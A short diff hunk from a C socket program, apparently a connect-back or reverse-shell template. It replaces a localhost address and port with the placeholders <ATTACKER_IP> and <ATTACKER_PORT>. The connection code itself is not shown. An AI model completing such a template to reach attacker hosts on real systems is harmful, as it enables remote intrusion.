@@ -4,8 +4,8 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 
-#define IP "127.0.0.1"
-#define PORT 1234
+#define IP <ATTACKER_IP>
+#define PORT <ATTACKER_PORT>
 
 int main(int argc, char **argv){
 
